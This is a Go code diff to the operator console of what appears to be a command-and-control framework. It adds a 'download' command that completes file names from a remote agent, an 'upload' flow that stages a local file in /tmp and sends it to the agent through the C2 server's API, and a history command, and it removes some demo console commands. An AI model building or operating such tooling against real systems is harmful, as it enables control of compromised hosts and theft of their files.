@@ -97,6 +97,9 @@ func Start(c2 string) {
 			readline.PcItem("cat",
 				readline.PcItemDynamic(listFiles(c2, agent)),
 			),
+			readline.PcItem("download",
+				readline.PcItemDynamic(listFiles(c2, agent)),
+			),
 			readline.PcItem("agent",
 				readline.PcItemDynamic(listAgents(c2)),
 			),
@@ -136,15 +139,6 @@ func Start(c2 string) {
 
 		line = strings.TrimSpace(line)
 		switch {
-		case strings.HasPrefix(line, "mode "):
-			switch line[5:] {
-			case "vi":
-				l.SetVimMode(true)
-			case "emacs":
-				l.SetVimMode(false)
-			default:
-				println("invalid mode:", line[5:])
-			}
 		case strings.HasPrefix(line, "agent "):
 			parts := strings.Split(line, " ")
 			agent = parts[1]
@@ -154,23 +148,12 @@ func Start(c2 string) {
 				break
 			}
 			println("you enter:", strconv.Quote(string(pswd)))
-		case strings.HasPrefix(line, "setprompt"):
-			if len(line) <= 10 {
-				log.Println("setprompt <prompt>")
+		case line == "history":
+			dat, err := ioutil.ReadFile("/tmp/readline.tmp")
+			if err != nil {
 				break
 			}
-			l.SetPrompt(line[10:])
-		case strings.HasPrefix(line, "say"):
-			line := strings.TrimSpace(line[3:])
-			if len(line) == 0 {
-				log.Println("say what?")
-				break
-			}
-			go func() {
-				for range time.Tick(time.Second) {
-					log.Println(line)
-				}
-			}()
+			fmt.Print(string(dat))
 		case line == "bye":
 			goto exit
 		case line == "sleep":
@@ -184,8 +167,26 @@ func Start(c2 string) {
 			}
 
 			if strings.Contains(cmdString, "upload ") {
-				fmt.Println("Upload file to remote")
-				fmt.Println(cmdString)
+				uuid := shortuuid.New()
+				parts := strings.Split(cmdString, " ")
+				file := parts[1]
+				copy(file, "/tmp/"+uuid)
+				cmdString = "upload " + uuid
+				cmdid := sendCommand(cmdString, agent, c2)
+				deadline := time.Now().Add(15 * time.Second)
+				for {
+					id, output := getOutput(c2+"/api/cmd/output/"+agent+"/"+cmdid, c2, cmdid)
+					if id == cmdid && output != "" || cmdString == "" {
+						fmt.Fprintln(os.Stderr, output)
+						wd := getAgentWorking(c2 + "/api/agent/" + agent)
+						l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
+						break
+					}
+					if time.Now().After(deadline) {
+						fmt.Fprintln(os.Stderr, "*Timeout*")
+						break
+					}
+				}
 				break
 			}
 
@@ -375,4 +376,29 @@ func updateCmdStatus(cmdid string, c2 string) {
 	if resp.Body != nil {
 		defer resp.Body.Close()
 	}
+}
+
+func copy(src, dst string) (int64, error) {
+	sourceFileStat, err := os.Stat(src)
+	if err != nil {
+		return 0, err
+	}
+
+	if !sourceFileStat.Mode().IsRegular() {
+		return 0, fmt.Errorf("%s is not a regular file", src)
+	}
+
+	source, err := os.Open(src)
+	if err != nil {
+		return 0, err
+	}
+	defer source.Close()
+
+	destination, err := os.Create(dst)
+	if err != nil {
+		return 0, err
+	}
+	defer destination.Close()
+	nBytes, err := io.Copy(destination, source)
+	return nBytes, err
 }
